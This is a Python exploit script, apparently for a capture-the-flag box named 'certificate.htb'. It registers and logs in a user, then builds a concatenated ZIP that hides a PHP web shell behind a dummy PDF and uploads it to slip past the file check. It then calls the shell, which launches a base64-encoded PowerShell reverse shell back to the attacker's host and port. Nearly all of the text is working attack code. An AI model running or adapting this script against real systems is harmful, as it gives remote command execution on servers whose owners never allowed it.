import requests
from zipfile import ZipFile
import sys
import os
from bs4 import BeautifulSoup
from base64 import b64encode

if len(sys.argv) < 4:
    print("[*] Usage: python3 ", sys.argv[0], " <target> <lhost> <lport>")
    sys.exit()

url = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]


proxies = {'http':'http://127.0.0.1:8080'}

def register():
    data = {
        'first_name':'x4c',
        'email':'x4c@pwn.local',
        'password':'password123',
        'password-confirm':'password123',
        'last_name':'x4c',
        'username':'x4c',
        'role':'student'
    }
    r = requests.post(url + '/register.php', data=data, proxies=proxies)
    if r.status_code == 200:
        print("[*] Registration Successful")
    else:
        print("[-] Registration failed with status code: ", r.status_code)



def get_cookie():
    r = requests.get(url + '/login.php', proxies=proxies)
    header_cookie = r.headers.get('Set-Cookie')
    if header_cookie:
        cookie = header_cookie.split('=')[1].split(';')[0]
        return cookie


def pwnfile():
    shell = f"$l = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$n = $l.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $n.Read($b, 0, $b.Length)) -ne 0){{;$a = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$d = (iex \". {{ $a }} 2>&1\" | Out-String ); $d2 = $d  + '[>] ';$p = ([text.encoding]::ASCII).GetBytes($d2);$n.Write($p,0,$p.Length);$n.Flush()}};$l.Close()"
    shell_enc = b64encode(shell.encode('utf-16-le')).decode()
    payload = f"<?php system('powershell.exe -ep bypass -w hidden -enc {shell_enc}'); ?>"
    with open("pwn.pdf", "w") as f:
        f.write("pwn pdf")
    with open("shell.php", "w") as h:
        h.write(payload)


    try :
         with ZipFile("pdf.zip", "w") as g:
            g.write("pwn.pdf")
            print("[*] Successfully Added pwn.pdf to pdf.zip")
    except FileNotFoundError:
         print("[-] The file pwn.pdf was not found")
    except Exception as e:
        print("[-] An error has occured ", e)

    try:
        with ZipFile("shell.zip" , "w") as z:
            z.write("shell.php")
            print("[*] Successfully added shell.php to shell.zip")
    except FileNotFoundError:
        print("[-] The file shell.php was not found")
    except Exception as e:
        print("[-] An error has occured: ", e)


    os.system("cat pdf.zip shell.zip > pwn.zip")
    print("[*] Final payload written to pwn.zip")






def pwn():
    s = requests.Session()
    cookie = get_cookie()
    headers = {
        'Cookie':f'PHPSESSID={cookie}',
        'Referer':'http://certificate.htb/login.php'
    }
    data = {
        'username':'x4c',
        'password':'password123'
    }
    r = s.post(url + '/login.php', data=data, headers=headers, allow_redirects=False, proxies=proxies)

    
    if r.status_code == 302:
        print("[*] Logged in")
    else:
        print("[*] Login failed with status code", r.status_code)

    
    
    params = {
        's_id':'36'
    }


    payload = {
        'info':'How to be the next Leonardo Da Vinci! - Final',
        'quizz_id':'36'
    }
    try:
        with open("pwn.zip", "rb") as f:
            files = {'file': (f.name, f, 'application/zip')}
            r1= s.post(url + '/upload.php', params=params, headers=headers, data=payload, files=files, proxies=proxies)

            if r1.status_code == 200:
                print("[*] File Uploaded Successfully")
            else:
                print("[-] Failed to upload file")

    except FileNotFoundError:
        print("[-] File Not found")
    except Exception as e:
        print("[-] An error has occured: ", e)

    
    soup = BeautifulSoup(r1.text, "html.parser")
    hrefs = soup.find_all('a', href=True)
    upload_url = ""
    for href in hrefs:
        if 'static/uploads' in href['href']:
            upload_url = href['href'].replace("pwn.pdf", "shell.php")
            break
    
    if not upload_url.startswith('/'):
        upload_url = '/' + upload_url
    print("[*] Upload URL found: ", url + upload_url)

    print("[*] Executing Shell")
    r2 = requests.get(url + upload_url)






pwnfile()
register()
pwn()
